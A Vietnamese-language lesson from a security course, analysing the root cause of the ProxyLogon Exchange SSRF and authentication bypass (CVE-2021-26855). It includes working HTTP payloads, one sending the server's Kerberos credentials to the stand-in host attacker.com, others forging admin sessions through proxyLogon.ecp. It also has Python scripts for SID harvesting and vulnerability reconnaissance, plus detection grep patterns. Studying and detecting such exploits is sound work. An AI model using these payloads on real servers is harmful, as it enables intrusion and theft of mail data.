---
title: "18. ProxyLogon Part 1 — SSRF & Auth Bypass Root Cause"
tags: [security, cve, landmark-cves, proxylogon, exchange, ssrf, auth-bypass, hafnium, lesson-18]
aliases: [ProxyLogon Part 1, CVE-2021-26855 Root Cause]
created: 2026-03-24
---

> **Prerequisites**: [[09-log4shell-root-cause|09. Log4Shell Part 1]] (SSRF concept), HTTP proxy/reverse proxy basics, .NET basics
> **Objectives**:
> - Hiểu kiến trúc Microsoft Exchange (Frontend/Backend, Client Access Service)
> - Phân tích `BEResourceRequestHandler` — entry point của SSRF
> - Hiểu cách cookie `X-BEResource` và `X-AnonResource-Backend` kiểm soát backend routing
> - Trace request flow: HTTP request → Frontend proxy → Backend (không qua auth)
> - Hiểu tại sao SSRF cho phép access `/ecp/proxyLogon.ecp` — internal auth bypass
> - Phân tích APT Hafnium attribution và timeline zero-day exploitation
> - So sánh CVE-2021-26855 với CVE-2021-27065 trong attack chain

---

## Bối cảnh: Vụ Tấn Công Lớn Nhất Năm 2021

Ngày 2/3/2021, Microsoft phát hành patch khẩn cấp cho bốn lỗ hổng zero-day trong Exchange Server. Cùng ngày, Microsoft công bố nhóm APT Hafnium (được cho là do Trung Quốc hậu thuẫn) đã khai thác những lỗi này để tấn công hàng chục nghìn tổ chức Mỹ và toàn cầu.

**Phạm vi:** Ước tính hơn **250.000 Exchange servers** bị compromise trong vòng vài ngày sau khi PoC xuất hiện công khai. CISA ra Emergency Directive 21-02 yêu cầu tất cả cơ quan liên bang Mỹ patch ngay lập tức.

**Attack chain hoàn chỉnh:**

```text
CVE-2021-26855  (SSRF)          → auth bypass
CVE-2021-26857  (Deserialization) → SYSTEM privileges  [thường không cần]
CVE-2021-26858  (File write)    → webshell drop        [post-auth]
CVE-2021-27065  (File write)    → webshell drop        [post-auth via SSRF]
```

Bài này tập trung vào **CVE-2021-26855** — lỗi SSRF cho phép bypass authentication, làm tiền đề cho toàn bộ chain.

---

## Microsoft Exchange Architecture

### Frontend / Backend Split

Exchange Server có kiến trúc hai lớp:

```text
Internet
  │ (HTTPS port 443)
  ▼
┌─────────────────────────────────────────────────────┐
│  FRONTEND (Client Access Service — CAS)              │
│  IIS vdir: /owa, /ecp, /ews, /mapi, /autodiscover   │
│  Role: receive client connections, authenticate,     │
│        proxy đến backend                            │
└──────────────────────┬──────────────────────────────┘
                       │ (internal HTTP — port 444)
                       ▼
┌─────────────────────────────────────────────────────┐
│  BACKEND (Mailbox Service)                           │
│  IIS vdir: /owa, /ecp, /ews, ...                    │
│  Role: xử lý actual logic, truy cập Active Directory│
│        và mailbox databases                          │
└─────────────────────────────────────────────────────┘
```

**Key insight**: Frontend proxy các request đến Backend **authenticated as Exchange computer account** (Kerberos). Backend tin tưởng mọi request từ Frontend vì chúng được xác thực bởi computer account.

### Anchor Mailbox — Request Routing

Frontend cần biết Backend server nào để proxy request đến (trong multi-server setup). Cơ chế là **Anchor Mailbox** — xác định user → xác định Backend server chứa mailbox của user đó.

Anchor mailbox được xác định qua nhiều cách: `X-AnchorMailbox` header, cookie, hay URL path. Đây là attack surface chính của các ProxyLogon/ProxyShell bugs.

---

## CVE-2021-26855 — Root Cause Analysis

### `BEResourceRequestHandler` — Vulnerable Code Path

Khi Exchange Frontend nhận request cho một **static resource** (file `.js`, `.css`, `.png`, etc.) trong `/ecp/` hoặc `/owa/`, nó dùng `BEResourceRequestHandler` — một handler không yêu cầu authentication (static files thường public).

Handler này có method `GetTargetBackEndServerUrl` để tính toán Backend URL:

```csharp
// HttpProxy\BEResourceRequestHandler.cs (decompiled, vulnerable version)
// Nguồn: Orange Tsai / DEVCORE research

protected override Uri GetTargetBackEndServerUrl() {
    string cookieValue = null;

    // Đọc cookie X-AnonResource-Backend
    HttpCookie cookie = this.ClientRequest.Cookies["X-AnonResource-Backend"];
    if (cookie != null) {
        cookieValue = cookie.Value;
    }

    // BUG: Backend URL được lấy TRỰC TIẾP từ cookie giá trị!
    // Không có whitelist check, không có SSRF protection
    if (cookieValue != null && cookieValue.Length > 0) {
        return new Uri(cookieValue);
        //     ↑ attacker-controlled URL
    }

    // Fallback: tính toán từ mailbox location
    return this.GetDefaultBackEndServerUrl();
}
```

Sau khi có Backend URL từ cookie, Frontend tạo HTTP request đến Backend:

```csharp
protected override void CreateServerRequest() {
    Uri backendUrl = this.GetTargetBackEndServerUrl();
    // ... build request ...
    this.serverRequest = WebRequest.Create(backendUrl);
    // Authenticate to backend via Kerberos (as Exchange computer account)
    this.serverRequest.Credentials = CredentialCache.DefaultCredentials;
    // ↑ không check xem backendUrl có hợp lệ không
}
```

> [!definition] Definition 18.1 — ProxyLogon SSRF Root Cause
> Exchange Frontend proxy đọc Backend URL **trực tiếp từ cookie `X-AnonResource-Backend`** mà không validate. Attacker gửi bất kỳ URL nào vào cookie này, Frontend sẽ forward HTTP request đến URL đó, **authenticated bằng Kerberos của Exchange computer account**. Điều này cho phép:
>
> 1. Truy cập các internal Exchange Backend endpoints không exposed ra internet
> 2. Bypass authentication vì request đến từ computer account (trusted source)
> 3. Access `/ecp/` backend trực tiếp, bao gồm `/ecp/proxyLogon.ecp`

---

## Attack Step 1 — SSRF Trigger

Request SSRF cơ bản để test:

```http
POST /ecp/x.js HTTP/1.1
Host: victim-exchange.com
Cookie: X-AnonResource-Backend=attacker.com:443/ecp/x.js?a=\x00AAAA&Email=autodiscover/autodiscover.json?@foo.com

```

Phân tích:
- **`/ecp/x.js`**: path kết thúc bằng `.js` → `IsResourceRequest()` check pass → dùng `BEResourceRequestHandler` (không cần auth!)
- **`X-AnonResource-Backend`**: set Backend URL về `attacker.com:443` → Frontend gửi request đến attacker server
- Attacker nhận callback HTTP từ Exchange server với `Authorization: Negotiate ...` header (Kerberos token)

Nhưng attacker không cần SSRF về external server. Mục tiêu thực sự là internal Backend.

---

## Attack Step 2 — Access `/ecp/proxyLogon.ecp`

Sau khi xác nhận SSRF, bước tiếp theo là call `/ecp/proxyLogon.ecp` — một internal Backend API:

```http
POST /ecp/x.js HTTP/1.1
Host: victim-exchange.com
Cookie: X-AnonResource-Backend=localhost/ecp/proxyLogon.ecp?a=\x00AAAA&Email=autodiscover/autodiscover.json?@foo.com
Content-Type: text/xml

<r at="Negotiate" ln="john.doe@victim.com">
  <s>
    <s t="1">S-1-5-21-xxx-xxx-xxx-500</s>
  </s>
</r>
```

`/ecp/proxyLogon.ecp` là một **internal authentication endpoint** — nó nhận SID (Security Identifier) của user muốn impersonate, tạo ECP session cho user đó, và trả về session cookies.

### Tại sao Backend chấp nhận request này?

Backend nhận request qua SSRF (từ `BEResourceRequestHandler`) với:
- Credential: Exchange computer account (Kerberos) — trusted!
- Header `msExchLogonMailbox`: Frontend đặt giá trị này để chỉ định mailbox người dùng

Backend không block `msExchLogonMailbox` header khi request đến từ Frontend — nhưng Frontend **không strip header này** khi proxy các static resource requests! Attacker có thể inject header tùy ý:

```csharp
// Frontend — BEResourceRequestHandler — MISSING header strip!
// Handler không gọi RemoveKnownHeaders() như các handler khác
// → cho phép user-supplied msExchLogonMailbox đi qua
```

---

## Lấy SID của Admin

Để impersonate admin, cần biết SID của account đó. Có nhiều cách:

### Method 1 — Exchange Autodiscover (không cần auth)

```http
GET /autodiscover/autodiscover.xml HTTP/1.1
Host: victim-exchange.com
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
  <Request>
    <EMailAddress>admin@victim.com</EMailAddress>
    <AcceptableResponseSchema>...</AcceptableResponseSchema>
  </Request>
</Autodiscover>
```

Response chứa internal information kể cả có thể leak SID.

### Method 2 — Wellknown SID của Administrator

Administrator domain account thường có SID dạng `S-1-5-21-[domain]-500`:

```python
# Nếu biết domain SID, admin SID = domain SID + "-500"
# Domain SID có thể lấy qua LDAP anonymous query
# hoặc từ Exchange error messages

def get_domain_sid_from_exchange(target):
    """
    Lấy domain SID qua Exchange EWS (thường accessible không cần full auth).
    """
    import requests
    url = f"https://{target}/ews/exchange.asmx"
    body = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Body>
    <ResolveNames xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"
                  ReturnFullContactData="false">
      <UnresolvedEntry>administrator</UnresolvedEntry>
    </ResolveNames>
  </soap:Body>
</soap:Envelope>'''
    resp = requests.post(url, data=body,
                         headers={"Content-Type": "text/xml"},
                         verify=False)
    # Parse SID từ response (nếu có)
    import re
    m = re.search(r'S-1-5-21-[\d-]+-\d+', resp.text)
    if m:
        return m.group(0)
    return None
```

---

## PoC SSRF Request — Python

```python
import requests
import urllib3
urllib3.disable_warnings()

TARGET = "https://victim-exchange.com"

def test_ssrf_connectivity(target):
    """
    Test xem SSRF có work không bằng cách check response.
    Gửi request đến /ecp/x.js với backend cookie trỏ về localhost.
    """
    url = f"{target}/ecp/x.js"
    headers = {
        "Cookie": (
            "X-AnonResource=true; "
            "X-AnonResource-Backend=localhost/ecp/x.js?a=\\x00AAAA; "
            "X-BEResource=localhost/ecp/x.js?a=\\x00AAAA"
        ),
        "Content-Type": "text/xml",
        "User-Agent": "Mozilla/5.0",
    }

    try:
        resp = requests.post(url, headers=headers,
                             timeout=10, verify=False)
        print(f"[*] SSRF test: HTTP {resp.status_code}")
        if "X-CalculatedBETarget" in resp.headers:
            print(f"[+] X-CalculatedBETarget: {resp.headers['X-CalculatedBETarget']}")
            print("[+] SSRF CONFIRMED — server reveals backend target in header")
            return True
        if resp.status_code in [200, 302, 400]:
            print("[?] Response received — may be vulnerable, needs further testing")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def check_exchange_version(target):
    """
    Detect Exchange version từ OWA/ECP headers.
    """
    try:
        resp = requests.get(f"{target}/owa/", verify=False, timeout=5,
                            allow_redirects=False)
        x_owa_version = resp.headers.get("X-OWA-Version", "")
        x_powered_by = resp.headers.get("X-Powered-By", "")
        server = resp.headers.get("Server", "")
        print(f"[*] Exchange detection:")
        print(f"    X-OWA-Version: {x_owa_version}")
        print(f"    X-Powered-By:  {x_powered_by}")
        print(f"    Server:        {server}")

        # Vulnerable versions
        vuln_versions = [
            "15.0.1497",  # Exchange 2013 CU23
            "15.1.2106",  # Exchange 2016 CU18
            "15.1.2176",  # Exchange 2016 CU19
            "15.2.721",   # Exchange 2019 CU7
            "15.2.792",   # Exchange 2019 CU8
        ]
        for v in vuln_versions:
            if v in x_owa_version:
                print(f"[+] VULNERABLE VERSION DETECTED: {x_owa_version}")
                return True
        if x_owa_version:
            print(f"[?] Version {x_owa_version} — check against MS advisory")
    except Exception as e:
        print(f"[-] Error: {e}")
    return False

if __name__ == "__main__":
    print("=== ProxyLogon CVE-2021-26855 Reconnaissance ===")
    print()
    check_exchange_version(TARGET)
    print()
    test_ssrf_connectivity(TARGET)
```

---

## CVE Family — ProxyLogon Attack Chain

| CVE | Loại | Vai trò trong chain |
|-----|------|-------------------|
| CVE-2021-26855 | Pre-auth SSRF | **Bài này** — bypass auth, access backend |
| CVE-2021-27065 | Post-auth file write | Chain với 26855 → write webshell |
| CVE-2021-26857 | Deserialization | Cần auth — leo thang sang SYSTEM |
| CVE-2021-26858 | Post-auth file write | Tương tự 27065, cần auth trước |

**Minimum chain để RCE:**
- CVE-2021-26855 (SSRF) → impersonate admin → có ECP session
- CVE-2021-27065 (file write) → dùng ECP session → write webshell

Bài tiếp theo sẽ phân tích CVE-2021-27065 và full exploit chain.

---

## Hafnium Attribution

Microsoft công bố nhóm HAFNIUM (suspected state-sponsored, China) khai thác zero-days này **trước khi patch** để target:
- Các nhà thầu quốc phòng Mỹ
- Law firms
- Các tổ chức nghiên cứu về bệnh truyền nhiễm
- Các NGO

Sau khi patch public, nhiều threat actor khác (ransomware groups, cryptominers) bắt đầu mass-exploit trong vòng 48 giờ.

Timeline key indicators:
- Tháng 1/2021: Volexity phát hiện Hafnium dùng CVE-2021-26855 để đọc email
- Tháng 1/2021: Devcore (Orange Tsai) báo cáo độc lập cho Microsoft
- 2/3/2021: Microsoft phát hành patch và attribution report
- 3/3/2021: PoC bắt đầu xuất hiện công khai
- 7/3/2021: Ước tính >100.000 servers đã compromise

---

## Detection

### IIS Log Patterns

```bash
# Tìm SSRF attempts trong Exchange IIS logs
grep -i "X-AnonResource-Backend" /IISLogs/W3SVC1/u_ex*.log

# Tìm /proxyLogon.ecp access
grep -i "proxyLogon" /IISLogs/*/u_ex*.log

# PowerShell — Microsoft's detection script
# Test-ProxyLogon.ps1 (https://github.com/microsoft/CSS-Exchange)
.\Test-ProxyLogon.ps1 -OutPath c:\output
```

### HTTP Request Indicators

```text
Pattern 1: SSRF trigger
  POST /ecp/*.js với Cookie chứa X-AnonResource-Backend
  Đặc biệt nếu backend URL = localhost hoặc internal IP

Pattern 2: ProxyLogon endpoint
  POST /ecp/proxyLogon.ecp (bình thường không accessible từ internet)
  → Nếu thấy trong log → CONFIRMED exploitation

Pattern 3: Webshell access sau exploit
  GET hoặc POST /aspnet_client/*.aspx
  GET hoặc POST /owa/auth/*.aspx
  GET hoặc POST /ecp/*.aspx
  Với cmd= parameter
```

---

## Summary

- Exchange CAS (Frontend) proxy requests đến Backend — Backend trust requests từ Frontend
- `BEResourceRequestHandler` phục vụ static resources không cần auth → backend URL lấy trực tiếp từ cookie
- Cookie `X-AnonResource-Backend` → attacker đặt URL tùy ý → SSRF trỏ đến localhost backend
- `/ecp/proxyLogon.ecp` là internal endpoint tạo ECP session từ SID — bypass auth hoàn toàn
- Frontend không strip `msExchLogonMailbox` header trong static resource handler → attacker inject header
- Chain: SSRF → access proxyLogon.ecp → ECP session → (CVE-2021-27065) file write → webshell
- Hafnium APT khai thác zero-day từ tháng 1/2021, mass exploitation sau public patch tháng 3/2021
- [[19-proxylogon-webshell-chain|Bài tiếp theo]]: CVE-2021-27065 file write mechanism và full chain PoC

---

## References

- Orange Tsai (DEVCORE) original research: https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/
- Google Project Zero root cause analysis: https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-26855.html
- Praetorian reproduction: https://www.praetorian.com/blog/reproducing-proxylogon-exploit/
- Microsoft advisory CVE-2021-26855: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855
- BI.ZONE hunting guide: https://bi-zone.medium.com/hunting-down-ms-exchange-attacks-part-1-proxylogon
- BlackHat 2021 slides (Orange Tsai): https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg.pdf
